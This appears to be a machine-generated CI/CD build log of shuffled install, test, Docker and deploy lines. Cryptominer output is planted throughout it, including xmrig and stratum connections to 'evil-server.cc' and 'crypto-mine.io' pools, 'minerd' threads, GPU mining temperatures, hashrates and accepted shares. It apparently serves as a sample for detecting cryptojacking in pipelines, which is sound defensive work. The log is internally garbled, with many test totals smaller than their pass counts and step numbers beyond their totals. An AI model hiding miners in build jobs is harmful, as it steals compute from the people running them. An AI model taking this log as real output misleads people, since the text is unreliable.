install: Successfully installed jest-1.10\n[12:47:59] WARN: Deprecated API usage\nPushing to registry...\nOptimizing 70 modules...\nArtifact uploaded: dist.zip (91MB)\nUploading artifact 'coverage' (4 files)\n[12:47:59] INFO: Request completed\nImage pulled successfully\npip: Downloading jest-2.14.tar.gz\nStep 7/24: Installing dependencies\nFetching from https://github.com/package.json\nTests: 311 passed, 70 total\nLayer 5/9: RUN command\nUsing Python 3.10\nVerifying...\nUsing Python 3.12\nFinished.\nEnvironment: staging\npip install: Successfully installed prettier-4.12\nCreating production build...\nStep 1/24: Installing dependencies\nxmrig: Starting mining on pool.evil-server.cc:3333\npip: Installing build dependencies...\nTests: 392 passed, 450 total\nUsing Python 3.9\nTransforming 766 files...\nArtifact uploaded: dist.zip (71MB)\nInstalling webpack@2.7.1\nFetching from https://npmjs.org/package.json\nWARNING: axios has known vulnerabilities\nMinifying vendor.js\nSnapshots: 22 passed, 26 total\nConnection established\n  PASS: test_api_health (358ms)\nSnapshots: 40 passed, 11 total\nCache saved successfully\nSnapshots: 8 passed, 32 total\nBundling main.css\nArtifact uploaded: build.tar.gz (19MB)\nLayer 5/10: ENV command\nTime: 11.720s\n[12:47:59] DEBUG: Memory usage: 1647MB\nCreating production build...\nCompiling utils/utils.go...\nMinifying vendor.js\n  PASS: unit/test_auth_login.spec.js\nEnvironment: test\nCompleted.\nStep 1/25: Testing\nTest Suites: 41 passed, 48 total\npip: Collecting prettier\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 12/23: Linting\n[12:47:59] INFO: Processing request\n\u2717 build failed with exit code 115\nCompiling utils/service.java...\nNODE_ENV=production\nCache saved successfully\nFAILED: test_user_create\n[12:47:59] DEBUG: Connection pool: 12 active\nEnvironment: production\n[12:47:59] INFO: Request completed\nAlready up to date.\nPOST /api - 200 (110ms)\nStep 15/17: Building\nConnection established\nArtifact uploaded: build.tar.gz (38MB)\nImage pulled successfully\nCache restored successfully (263MB)\nConnection established\nCompiling components/handler.rs...\nLayer 7/12: ENV command\nArtifact uploaded: build.tar.gz (20MB)\nHEAD is now at 10500c5\nyarn add: Done in 11.49s\nBundling styles.js\nWaiting...\n\u2713 All checks passed\npip: Collecting webpack\n[12:47:59] WARN: Deprecated API usage\nWaiting...\nStep 17/24: Deploying\nOptimizing 76 modules...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: prettier has known vulnerabilities\nCompleted.\nStep 3/21: Testing\nBuilding Docker image...\nStep 13/24: Running migrations\nGenerating source maps...\nTests: 238 passed, 266 total\nMinifying vendor.js\nPushing to registry...\nFinished.\nTests: 268 passed, 481 total\nCoverage: 90% statements, 68% branches\nCoverage: 81% statements, 98% branches\n[12:47:59] INFO: Connecting to database\nnpm install: added 33 packages\nArtifact uploaded: build.tar.gz (36MB)\nWaiting...\nHEAD is now at 50e0ef9\nImage pulled successfully\n[12:47:59] DEBUG: Connection pool: 1 active\nWaiting...\nFetching from https://npmjs.org/package.json\n[12:47:59] ERROR: Connection failed\n[12:47:59] WARN: Deprecated API usage\nGenerating source maps...\nSuccess!\nUsing Python 3.11\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:47:59] INFO: Cache refreshed\nStep 9/16: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nGenerating source maps...\nFinished.\nStep 15/23: Running migrations\nCache restored successfully (186MB)\nHEAD is now at 642fd9e\nPushing to registry...\nOK\nAlready up to date.\nDone.\nPulling image: python:3.11\nException: TypeError\nTest Suites: 45 passed, 25 total\n[12:47:59] INFO: Request completed\nFetching from https://googleapis.com/package.json\nArtifact downloaded: 21MB\nWaiting...\nHEAD is now at f24d583\nPushing to registry...\nImage pulled successfully\nStep 16/23: Building\nProcessing...\nLoading...\npip: Collecting react\nWARNING: eslint has known vulnerabilities\nnpm notice: created a lockfile\nConnecting to stratum+tcp://mine.evil-server.cc:3333\n  PASS: test_user_create (298ms)\n[12:47:59] DEBUG: Query executed in 94ms\nPulling image: node:18\nMinifying main.js\nnpm notice: created a lockfile\n[12:47:59] DEBUG: Loading configuration\nPOST /api - 201 (472ms)\n[12:47:59] INFO: Processing request\nWARNING: jest has known vulnerabilities\n[12:47:59] DEBUG: Connection pool: 8 active\nGenerating source maps...\n\u2713 build completed\nyarn add: Done in 8.74s\npip: Downloading lodash-5.18.tar.gz\n[12:47:59] DEBUG: Memory usage: 1057MB\nLoading...\nHEAD is now at 0ac115e\nCompiling src/index.js...\nPOST /data - 200 (31ms)\n[12:47:59] DEBUG: Connection pool: 13 active\nUsing Node.js 18.12.1\nStep 13/24: Testing\nHEAD is now at 2220b12\nFetching submodules...\nCache hit for key-6497\nInstalling express@1.1.7\nCompiling utils/main.py...\n  PASS: test_api_health (126ms)\nCache hit for key-3446\nGET /health - 201 (2ms)\nSwitched to branch 'feature/task-426'\n=== Step integration_tests completed ===\n=== Step: lint ===\nLayer 10/13: RUN command\nMinifying vendor.js\nProcessing...\npip: Collecting axios\nCache saved successfully\nOK\nConnection established\nVerifying...\nWaiting...\nWARNING: jest has known vulnerabilities\nFAILED: test_user_create\n\u2717 build failed with exit code 67\nnpm install: resolved 740 packages\nTLS handshake completed\nStep 20/18: Running migrations\nCompleted.\nnpm notice: package.json updated\nStep 10/21: Running migrations\nStep 12/24: Installing dependencies\nGET /status - 201 (50ms)\nNODE_ENV=development\nFetching submodules...\nStep 16/20: Running migrations\nStep 16/18: Building\nFetching submodules...\nnpm notice: package.json updated\nCache miss for key-3340\nPulling image: node:18\nLoading...\nCompiling lib/utils.go...\nArtifact downloaded: 40MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nChecking out main branch\nnpm notice: created a lockfile\n[12:47:59] ERROR: Connection failed\nBuilding Docker image...\nCompiling utils/service.java...\nVerifying...\npip install: Successfully installed react-3.11\nCompiling src/main.py...\n\u2713 Step 'checkout' succeeded\nnpm install: resolved 357 packages\nTest Suites: 8 passed, 25 total\nDone.\n[12:47:59] DEBUG: Memory usage: 1005MB\nArtifact uploaded: build.tar.gz (15MB)\nLayer 3/14: RUN command\nStep 16/23: Testing\n[12:47:59] INFO: Connecting to database\nnpm notice: package.json updated\nArtifact uploaded: dist.zip (73MB)\n\u2713 Step 'test' succeeded\nStep 2/16: Running migrations\nSuccess!\nVerifying...\nDone.\nBuilding Docker image...\nProcessing...\n[12:47:59] ERROR: Connection failed\nMinifying app.js\nCreating production build...\n[12:47:59] DEBUG: Query executed in 23ms\nLayer 1/15: RUN command\nTransforming 939 files...\n[12:47:59] INFO: Cache refreshed\nTest Suites: 12 passed, 44 total\nCompiling src/main.py...\nCreating production build...\n[12:47:59] INFO: Request completed\nWARNING: lodash has known vulnerabilities\npip: Collecting eslint\nMinifying main.js\nAlready up to date.\nUsing Node.js 20.16.5\n[12:47:59] INFO: Request completed\nNODE_ENV=test\nVerifying...\nnpm notice: created a lockfile\nChecking out master branch\nChecking out main branch\nCreating production build...\n[12:47:59] DEBUG: Connection pool: 19 active\nChecking out develop branch\n[12:47:59] INFO: Starting build process\nWARNING: jest has known vulnerabilities\nFinished.\nTLS handshake completed\nCompleted.\nOK\n[12:47:59] INFO: Request completed\nCache restored successfully (176MB)\n\u2713 Task completed in 3558ms\n  PASS: unit/test_api_health.spec.js\n  PASS: test_cache_hit (353ms)\nEnvironment: staging\nyarn add: Done in 1.63s\nCache miss for key-9526\n\u2713 Task completed in 2083ms\nLayer 10/9: ENV command\nWARNING: jest has known vulnerabilities\nAlready up to date.\nCache miss for key-2369\nDone.\nTime: 43.982s\nInstalling jest@4.5.6\nTest Suites: 31 passed, 23 total\nDone.\nVerifying...\n\u2713 All checks passed\n[12:47:59] DEBUG: Initializing service\nTests: 415 passed, 94 total\nnpm install: resolved 1518 packages\nVerifying...\nCache hit for key-8651\nCompleted.\nStep 14/20: Running migrations\nDone.\n\u2713 deploy completed\nCreating production build...\n[12:47:59] DEBUG: Loading configuration\nStep 18/23: Building\nSuccess!\nBundling styles.css\n  PASS: unit/test_api_health.spec.js\nSnapshots: 36 passed, 27 total\nTLS handshake completed\n\u2713 Step 'setup' succeeded\nPlatform: linux-x64\nnpm notice: created a lockfile\nCache restored successfully (205MB)\nyarn add: Done in 30.5s\nnpm notice: package.json updated\nOptimizing 55 modules...\nCache saved successfully\nAlready up to date.\nOptimizing 27 modules...\n[12:47:59] INFO: Request completed\nnpm notice: package.json updated\nFAILED: test_auth_login\nTransforming 393 files...\nCompiling components/utils.go...\nStep 13/25: Building\nReady.\nGenerating source maps...\nFAILED: test_cache_hit\nCache invalidated: node_modules\nStep 5/19: Linting\npip: Collecting webpack\n[12:47:59] INFO: Starting build process\nCompiling components/main.py...\nVerifying...\nCache invalidated: dependencies\n[12:47:59] INFO: Cache refreshed\npip: Installing build dependencies...\nTime: 48.597s\nTransforming 307 files...\n[12:47:59] INFO: Starting build process\n[12:47:59] DEBUG: Loading configuration\nCache miss for key-6974\n  PASS: integration/test_api_health.spec.js\nUsing Node.js 19.6.6\nBundling main.js\nnpm notice: package.json updated\nSnapshots: 5 passed, 28 total\nUploading artifact 'dist' (15 files)\nnpm notice: package.json updated\nImage pulled successfully\nSnapshots: 37 passed, 23 total\nCompiling lib/index.js...\nCache miss for key-1057\nTest Suites: 44 passed, 5 total\n  PASS: test_user_create (187ms)\nProcessing...\nTLS handshake completed\n\u2713 deploy completed\nStep 20/24: Building\nImage pulled successfully\npip: Installing build dependencies...\nCache saved successfully\nArtifact uploaded: build.tar.gz (43MB)\nSuccess!\nCompiling components/main.py...\nPlatform: win32-x64\nArtifact uploaded: dist.zip (60MB)\n  PASS: e2e/test_api_health.spec.js\n[12:47:59] DEBUG: Memory usage: 1388MB\nEnvironment: development\npip: Collecting axios\nWARNING: eslint has known vulnerabilities\n  PASS: test_db_connect (358ms)\nCompleted.\nPulling image: node:18\nStep 2/23: Installing dependencies\nTime: 82.703s\nWaiting...\n[12:47:59] DEBUG: Memory usage: 428MB\nStep 13/19: Testing\nArtifact uploaded: build.tar.gz (37MB)\n\u2717 build failed with exit code 39\nReady.\nStep 9/23: Linting\nCompiling utils/handler.rs...\nPlatform: linux-x64\nStep 17/21: Deploying\nnpm notice: package.json updated\nWARNING: axios has known vulnerabilities\nBundling main.css\nCache hit for key-9390\nVerifying...\nStep 14/15: Linting\nnpm install: added 490 packages\nFAILED: test_cache_hit\nNODE_ENV=production\nArtifact uploaded: dist.zip (83MB)\nWaiting...\nCache miss for key-5356\n[12:47:59] DEBUG: Memory usage: 1388MB\nOK\nTests: 464 passed, 464 total\nProcessing...\nOK\nPulling image: python:3.11\nPOST /data - 201 (335ms)\nTests: 93 passed, 333 total\n[12:47:59] DEBUG: Connection pool: 18 active\n[12:47:59] INFO: Starting build process\npip: Collecting webpack\n[12:47:59] INFO: Processing request\nnpm notice: created a lockfile\n[12:47:59] INFO: Request completed\nDone.\n[12:47:59] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 5/24: Installing dependencies\nNODE_ENV=test\nCoverage: 83% statements, 87% branches\nNODE_ENV=production\nInstalling lodash@1.7.0\nInstalling lodash@5.3.3\nOptimizing 12 modules...\n=== Step lint completed ===\n=== Step: type_check ===\nWARNING: eslint has known vulnerabilities\n[12:47:59] INFO: Connecting to database\nStep 20/23: Building\nSnapshots: 49 passed, 19 total\nArtifact downloaded: 2MB\nUploading artifact 'build' (12 files)\n[12:47:59] DEBUG: Initializing service\n[12:47:59] ERROR: Connection failed\n[12:47:59] DEBUG: Memory usage: 1175MB\n[12:47:59] INFO: Request completed\nNODE_ENV=development\nLayer 3/11: ENV command\nStep 1/16: Deploying\nWaiting...\npip install: Successfully installed axios-2.11\nCache miss for key-8912\n\u2713 All checks passed\nBundling runtime.css\nCoverage: 95% statements, 94% branches\nSnapshots: 47 passed, 34 total\n[12:47:59] DEBUG: Initializing service\n[12:47:59] WARN: Deprecated API usage\nStep 12/15: Linting\n[12:47:59] INFO: Request completed\nnpm notice: package.json updated\nCoverage: 98% statements, 78% branches\nUsing Node.js 18.18.10\nGenerating source maps...\nUsing Python 3.9\n[12:47:59] INFO: Starting build process\nWARNING: axios has known vulnerabilities\nCache invalidated: node_modules\nCompiling lib/index.js...\nTest Suites: 15 passed, 47 total\npip: Collecting eslint\nReady.\nTests: 313 passed, 146 total\nFinished.\nAlready up to date.\nFinished.\nChecking out develop branch\nException: NullPointerException\nWARNING: express has known vulnerabilities\npip install: Successfully installed eslint-1.6\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:47:59] INFO: Cache refreshed\n[12:47:59] DEBUG: Initializing service\nSuccess!\n[12:47:59] DEBUG: Memory usage: 584MB\nGenerating source maps...\nnpm install: added 397 packages\nProcessing...\n  PASS: test_cache_hit (415ms)\nStep 16/25: Installing dependencies\nUsing Node.js 17.19.6\nBundling vendor.css\nBundling vendor.css\n[12:47:59] DEBUG: Memory usage: 293MB\nnpm install: added 122 packages\nPlatform: linux-x64\nFetching submodules...\n[12:47:59] WARN: Deprecated API usage\nCache miss for key-8036\nUploading artifact 'build' (34 files)\nStep 20/25: Linting\nLayer 5/11: ENV command\n[12:47:59] INFO: Request completed\n[12:47:59] INFO: Cache refreshed\nDone.\npip: Collecting react\nCompiling components/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:47:59] WARN: Deprecated API usage\n[12:47:59] ERROR: Connection failed\nSwitched to branch 'feature/task-399'\nStep 16/18: Deploying\nLayer 10/12: COPY command\nOK\nnpm install: resolved 1393 packages\nArtifact uploaded: build.tar.gz (19MB)\nImage pulled successfully\nCoverage: 80% statements, 87% branches\nVerifying...\n\u2713 Task completed in 2559ms\nFinished.\nFetching from https://gcr.io/package.json\nHEAD is now at 3b19580\nCoverage: 85% statements, 71% branches\nyarn add: Done in 15.15s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nDone.\nPOST /upload - 201 (200ms)\n[12:47:59] INFO: Processing request\nArtifact downloaded: 49MB\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nConnection established\nStep 18/20: Deploying\nChecking out develop branch\nTime: 8.202s\nGET /status - 200 (70ms)\nGenerating source maps...\npip: Downloading react-2.17.tar.gz\nImage pulled successfully\nOK\nFetching submodules...\nWARNING: react has known vulnerabilities\nStep 19/15: Testing\nInstalling eslint@2.9.8\nReady.\nnpm notice: created a lockfile\nInstalling axios@4.5.7\n[12:47:59] DEBUG: Initializing service\nnpm install: resolved 1226 packages\nRan 99 tests in 51s\nWARNING: jest has known vulnerabilities\nCache restored successfully (70MB)\nPOST /data - 201 (207ms)\nPOST /data - 202 (34ms)\nGET /health - 204 (15ms)\n[12:47:59] INFO: Request completed\n[12:47:59] DEBUG: Memory usage: 1605MB\nnpm notice: package.json updated\nTest Suites: 44 passed, 48 total\n\u2713 Step 'build' succeeded\nPushing to registry...\nSnapshots: 28 passed, 49 total\nBuilding Docker image...\nHEAD is now at 294784c\n[12:47:59] DEBUG: Loading configuration\nStep 10/20: Testing\nGenerating source maps...\n[12:47:59] INFO: Connecting to database\nCompiling src/main.py...\n[12:47:59] INFO: Starting build process\nFAILED: test_db_connect\nPushing to registry...\nWaiting...\n\u2713 deploy completed\nBuilding Docker image...\n  PASS: test_db_connect (137ms)\nyarn add: Done in 29.78s\npip: Collecting axios\n[12:47:59] DEBUG: Connection pool: 16 active\nStep 3/17: Testing\nLoading...\npip install: Successfully installed webpack-1.16\n  PASS: test_user_create (384ms)\n\u2717 build failed with exit code 77\nUsing Python 3.12\nFinished.\nnpm install: resolved 132 packages\nAlready up to date.\n  PASS: integration/test_user_create.spec.js\nOK\nEnvironment: staging\nImage pulled successfully\n  PASS: unit/test_api_health.spec.js\nStep 16/20: Building\nSnapshots: 30 passed, 40 total\nStep 20/17: Running migrations\nSuccess!\nCache hit for key-4634\nPulling image: node:3.11\nCreating production build...\nNODE_ENV=development\nPushing to registry...\n[12:47:59] INFO: Connecting to database\nStep 11/15: Building\npip install: Successfully installed prettier-4.18\nCompiling utils/handler.rs...\nImage pulled successfully\npip install: Successfully installed prettier-2.12\n[12:47:59] DEBUG: Query executed in 74ms\nUsing Python 3.12\nLayer 3/15: COPY command\nnpm notice: created a lockfile\nSnapshots: 36 passed, 4 total\nTime: 103.295s\nTime: 71.586s\nCompiling lib/service.java...\n[12:47:59] WARN: Deprecated API usage\npip: Installing build dependencies...\nUsing Node.js 19.13.1\nUsing Node.js 20.0.1\nNODE_ENV=test\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:47:59] DEBUG: Loading configuration\nWARNING: express has known vulnerabilities\nReady.\nEnvironment: production\nTime: 74.143s\nConnection established\nFAILED: test_db_connect\nVerifying...\nPlatform: win32-x64\nSnapshots: 15 passed, 42 total\nPlatform: darwin-arm64\npip: Downloading jest-5.16.tar.gz\nArtifact uploaded: build.tar.gz (38MB)\npip: Downloading react-2.6.tar.gz\nSwitched to branch 'bugfix/task-693'\npip: Downloading express-3.13.tar.gz\npip: Downloading lodash-4.14.tar.gz\nGET /status - 201 (29ms)\nCache restored successfully (429MB)\n[12:47:59] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Installing build dependencies...\nChecking out main branch\nUsing Node.js 20.8.0\nSnapshots: 24 passed, 14 total\nImage pulled successfully\nWARNING: axios has known vulnerabilities\nPulling image: alpine:3.11\n[12:47:59] DEBUG: Memory usage: 1611MB\nTLS handshake completed\nMinifying main.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_cache_hit (263ms)\n[12:47:59] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (17MB)\nArtifact uploaded: dist.zip (47MB)\nArtifact uploaded: dist.zip (80MB)\nCompiling lib/utils.go...\n[12:47:59] DEBUG: Initializing service\n[12:47:59] INFO: Connecting to database\nDone.\nTime: 117.231s\nCreating production build...\nLayer 2/13: RUN command\n[12:47:59] WARN: Deprecated API usage\nStep 20/16: Deploying\nBundling vendor.js\nCompiling lib/index.js...\nWaiting...\nCompiling utils/handler.rs...\nCache restored successfully (440MB)\nStep 15/25: Testing\nBundling main.css\n=== Step type_check completed ===\n=== Step: e2e_tests ===\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nGET /status - 204 (34ms)\nCompleted.\nSwitched to branch 'hotfix/task-143'\nCompiling utils/service.java...\nUsing Python 3.12\n\u2713 Task completed in 284ms\npip: Installing build dependencies...\nStep 19/24: Linting\nCompiling lib/index.js...\n[12:47:59] WARN: Deprecated API usage\nEnvironment: development\nSuccess!\npip: Installing build dependencies...\nWaiting...\nyarn add: Done in 5.67s\n  PASS: e2e/test_auth_login.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: dist.zip (5MB)\nProcessing...\nCache invalidated: build\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nBuilding Docker image...\nSwitched to branch 'feature/task-927'\nDone.\nyarn add: Done in 25.89s\n[12:47:59] DEBUG: Memory usage: 1829MB\nPulling image: python:18\npip install: Successfully installed jest-4.13\n  PASS: test_auth_login (37ms)\nUploading artifact 'coverage' (28 files)\nCreating production build...\nImage pulled successfully\n[12:47:59] DEBUG: Connection pool: 5 active\n\u2717 build failed with exit code 85\nArtifact uploaded: build.tar.gz (5MB)\nArtifact downloaded: 7MB\npip: Collecting prettier\nAlready up to date.\nCache saved successfully\nnpm notice: created a lockfile\nMinifying app.js\n\u2713 lint completed\nPushing to registry...\nStep 16/22: Testing\n[12:47:59] INFO: Request completed\nVerifying...\nUploading artifact 'dist' (25 files)\n[12:47:59] INFO: Starting build process\n[12:47:59] DEBUG: Memory usage: 1940MB\n[12:47:59] DEBUG: Loading configuration\nStep 16/23: Running migrations\nPulling image: python:3.11\nWARNING: express has known vulnerabilities\npip: Installing build dependencies...\nOK\nFAILED: test_auth_login\n  PASS: test_api_health (430ms)\nnpm notice: package.json updated\n  PASS: integration/test_auth_login.spec.js\n[12:47:59] DEBUG: Initializing service\n[12:47:59] INFO: Processing request\nReady.\nnpm install: added 177 packages\nFetching from https://npmjs.org/package.json\nEnvironment: staging\n[12:47:59] WARN: Deprecated API usage\nStep 13/25: Building\nyarn add: Done in 13.25s\n[12:47:59] ERROR: Connection failed\nStep 16/25: Linting\nTransforming 438 files...\nConnection established\nStep 14/24: Deploying\npip: Installing build dependencies...\nCompiling lib/index.js...\n[12:47:59] DEBUG: Query executed in 85ms\n[12:47:59] INFO: Connecting to database\nPulling image: alpine:latest\nTime: 70.454s\nStep 3/20: Building\nWARNING: webpack has known vulnerabilities\nLoading...\n\u2717 build failed with exit code 19\nPulling image: alpine:3.11\nSwitched to branch 'feature/task-610'\nTests: 372 passed, 410 total\nCache miss for key-2351\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPOST /api - 200 (472ms)\nSwitched to branch 'bugfix/task-140'\nLoading...\nStep 10/23: Building\nWARNING: express has known vulnerabilities\nFetching from https://npmjs.org/package.json\n[12:47:59] WARN: Deprecated API usage\nGET /health - 200 (24ms)\nPlatform: linux-x64\nStep 8/22: Deploying\nTime: 10.909s\n[12:47:59] DEBUG: Initializing service\n[12:47:59] WARN: Deprecated API usage\nWaiting...\nUploading artifact 'build' (1 files)\nConnection established\nLoading...\nPulling image: alpine:18\n[12:47:59] DEBUG: Query executed in 97ms\nFetching submodules...\n[12:47:59] DEBUG: Initializing service\npip: Installing build dependencies...\nFinished.\nCompiling utils/app.ts...\nFAILED: test_db_connect\n[12:47:59] DEBUG: Initializing service\n[12:47:59] INFO: Starting build process\nStep 6/16: Running migrations\nUsing Node.js 15.15.1\n[12:47:59] DEBUG: Connection pool: 3 active\n[12:47:59] DEBUG: Initializing service\n[12:47:59] INFO: Connecting to database\nCompiling components/index.js...\nCompiling lib/main.py...\n\u2713 All checks passed\nNODE_ENV=production\npip: Downloading prettier-4.1.tar.gz\nWaiting...\nStep 19/19: Building\nCache hit for key-4555\nFetching from https://registry.npmjs.org/package.json\nCompiling components/utils.go...\nEnvironment: test\nCompiling components/main.py...\n[12:47:59] DEBUG: Query executed in 15ms\nnpm notice: created a lockfile\n\u2713 Task completed in 1783ms\npip install: Successfully installed prettier-2.10\n\u2713 Task completed in 4814ms\nyarn add: Done in 3.31s\nAlready up to date.\n  PASS: test_auth_login (116ms)\nConnection established\n[12:47:59] INFO: Starting build process\nWARNING: express has known vulnerabilities\n\u2717 build failed with exit code 29\nPulling image: python:3.11\n[12:47:59] INFO: Connecting to database\nFinished.\npip: Downloading react-1.1.tar.gz\nArtifact uploaded: build.tar.gz (20MB)\nnpm notice: created a lockfile\nPOST /data - 201 (177ms)\nTest Suites: 48 passed, 23 total\n[12:47:59] INFO: Processing request\nEnvironment: staging\nNODE_ENV=test\nCache hit for key-2749\nWaiting...\nGenerating source maps...\nCompleted.\n[12:47:59] INFO: Connecting to database\nnpm install: resolved 1411 packages\nTests: 228 passed, 100 total\nStep 18/21: Building\nProcessing...\nFetching from https://github.com/package.json\nGenerating source maps...\nChecking out develop branch\nArtifact uploaded: dist.zip (80MB)\nStep 15/16: Linting\nConnection established\nnpm install: added 45 packages\nBuilding Docker image...\n\u2713 All checks passed\n[12:47:59] ERROR: Connection failed\n[12:47:59] INFO: Starting build process\nStep 9/25: Building\nEnvironment: production\nConnection established\nCompiling lib/utils.go...\nConnection established\nBuilding Docker image...\nnpm notice: package.json updated\nFinished.\nInstalling webpack@4.11.10\nFetching submodules...\nSwitched to branch 'hotfix/task-752'\nWARNING: react has known vulnerabilities\n[12:47:59] INFO: Processing request\nFetching from https://github.com/package.json\nStep 16/23: Running migrations\n[12:47:59] WARN: Deprecated API usage\nCompiling components/handler.rs...\n\u2713 Step 'setup' succeeded\nPOST /upload - 201 (167ms)\nException: RuntimeError\n[12:47:59] INFO: Starting build process\npip: Installing build dependencies...\n  PASS: e2e/test_api_health.spec.js\n[12:47:59] INFO: Request completed\nFinished.\nBundling vendor.js\npip: Installing build dependencies...\n[12:47:59] INFO: Starting build process\nException: NullPointerException\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm notice: package.json updated\nWARNING: prettier has known vulnerabilities\nMinifying vendor.js\n[12:47:59] INFO: Starting build process\nTLS handshake completed\nBuilding Docker image...\nCache miss for key-5828\nFinished.\nnpm notice: package.json updated\nOK\n\u2713 validate completed\nStep 5/21: Testing\nVerifying...\n[12:47:59] WARN: Deprecated API usage\n\u2713 test completed\nNODE_ENV=development\nUploading artifact 'build' (29 files)\nBundling styles.css\nCache miss for key-5274\nStep 11/17: Building\nCompiling components/utils.go...\nOptimizing 29 modules...\nMinifying main.js\nHEAD is now at 640d9e5\nUsing Node.js 18.1.9\n  PASS: integration/test_user_create.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSwitched to branch 'bugfix/task-850'\n[12:47:59] DEBUG: Initializing service\nnpm notice: package.json updated\nCompleted.\nCache restored successfully (227MB)\n[12:47:59] DEBUG: Initializing service\n=== Step e2e_tests completed ===\n=== Step: build ===\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 10/16: Linting\n[12:47:59] INFO: Starting build process\nRan 175 tests in 41s\n[12:47:59] DEBUG: Memory usage: 1874MB\nCache invalidated: build\nArtifact uploaded: build.tar.gz (24MB)\n\u2717 build failed with exit code 108\nTests: 134 passed, 400 total\n[12:47:59] DEBUG: Connection pool: 20 active\n[12:47:59] DEBUG: Connection pool: 5 active\nCache hit for key-6251\nEnvironment: staging\nStep 19/15: Building\n\u2713 Step 'test' succeeded\n\u2713 deploy completed\nOptimizing 62 modules...\nAlready up to date.\nCache hit for key-7990\npip: Collecting react\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip: Installing build dependencies...\npip: Collecting express\nChecking out master branch\nStep 5/23: Running migrations\nCreating production build...\nnpm notice: package.json updated\nWARNING: prettier has known vulnerabilities\nOptimizing 40 modules...\nBundling vendor.css\nTests: 455 passed, 228 total\nOptimizing 76 modules...\n[12:47:59] WARN: Deprecated API usage\nWaiting...\nGET /api - 200 (7ms)\nCompiling src/service.java...\nFinished.\nnpm install: added 98 packages\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 20/16: Deploying\nReady.\nPOST /upload - 200 (143ms)\n  PASS: unit/test_user_create.spec.js\n[12:47:59] INFO: Processing request\nFAILED: test_user_create\nCache saved successfully\nEnvironment: production\nGET /status - 200 (92ms)\n[12:47:59] INFO: Connecting to database\n\u2713 build completed\nTime: 99.98s\nTests: 236 passed, 258 total\nEnvironment: production\nCreating production build...\nCache miss for key-3521\n[12:47:59] INFO: Request completed\n[12:47:59] DEBUG: Connection pool: 9 active\nRan 32 tests in 54s\nSwitched to branch 'bugfix/task-473'\n\u2713 Step 'install' succeeded\nNODE_ENV=test\nStep 6/22: Building\nGenerating source maps...\nyarn add: Done in 15.69s\nCompiling utils/service.java...\nCompiling src/app.ts...\npip: Installing build dependencies...\nCompiling src/handler.rs...\nVerifying...\nCompiling lib/handler.rs...\nTest Suites: 32 passed, 47 total\nnpm notice: package.json updated\nTime: 116.818s\nTests: 181 passed, 251 total\nAccepted share #232\nBundling main.css\n[12:47:59] DEBUG: Query executed in 29ms\nyarn add: Done in 15.67s\nVerifying...\nPOST /upload - 201 (312ms)\nnpm notice: created a lockfile\nStep 1/24: Installing dependencies\nminerd: 8 threads active\n  PASS: integration/test_api_health.spec.js\n\u2713 Task completed in 4410ms\nAlready up to date.\nCache saved successfully\n[12:47:59] WARN: Deprecated API usage\npip: Downloading axios-5.15.tar.gz\nBuilding Docker image...\nCoverage: 73% statements, 88% branches\n  PASS: test_auth_login (161ms)\nGPU #0: 85\u00b0C, mining\nCache hit for key-6213\nStep 3/23: Installing dependencies\nCache restored successfully (150MB)\nTime: 85.355s\nConnection established\n\u2713 test completed\nFAILED: test_user_create\nUsing Python 3.12\n\u2713 Step 'test' succeeded\nChecking out master branch\nArtifact downloaded: 38MB\nStep 1/20: Building\n\u2717 build failed with exit code 73\nCache restored successfully (271MB)\nPlatform: linux-x64\nOptimizing 13 modules...\nStep 16/19: Installing dependencies\nMinifying app.js\nPushing to registry...\nBundling styles.css\nRan 182 tests in 13s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nminerd: 8 threads active\nCache hit for key-6306\nConnecting to stratum+tcp://mine.crypto-mine.io:3333\nStep 20/18: Installing dependencies\nUploading artifact 'coverage' (25 files)\nCache invalidated: dependencies\nFetching submodules...\nEnvironment: development\nReady.\n[12:47:59] DEBUG: Connection pool: 16 active\nFetching from https://pypi.org/package.json\nGenerating source maps...\nImage pulled successfully\nArtifact uploaded: build.tar.gz (11MB)\nStep 8/19: Testing\nSwitched to branch 'feature/task-837'\nPlatform: win32-x64\nLoading...\n  PASS: unit/test_db_connect.spec.js\nPulling image: node:18\nHEAD is now at d71c11f\nCompiling src/index.js...\nInstalling prettier@2.5.1\nWARNING: webpack has known vulnerabilities\nStep 8/15: Building\nStep 16/19: Running migrations\n[12:47:59] DEBUG: Memory usage: 1740MB\nReady.\nSwitched to branch 'bugfix/task-851'\nGPU #3: 85\u00b0C, mining\n[12:47:59] DEBUG: Query executed in 90ms\n[12:47:59] DEBUG: Loading configuration\n[12:47:59] INFO: Cache refreshed\nPulling image: python:18\n\u2713 Step 'setup' succeeded\ncryptonight: Hashrate: 4835 H/s\nPOST /data - 201 (197ms)\nyarn add: Done in 19.17s\n\u2713 All checks passed\nCompiling lib/handler.rs...\n[12:47:59] DEBUG: Query executed in 87ms\nCache restored successfully (431MB)\n[12:47:59] INFO: Starting build process\nOK\nPulling image: python:18\nCache hit for key-4161\n[12:47:59] DEBUG: Connection pool: 8 active\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nLoading...\nFetching from https://npmjs.org/package.json\nChecking out main branch\n[12:47:59] 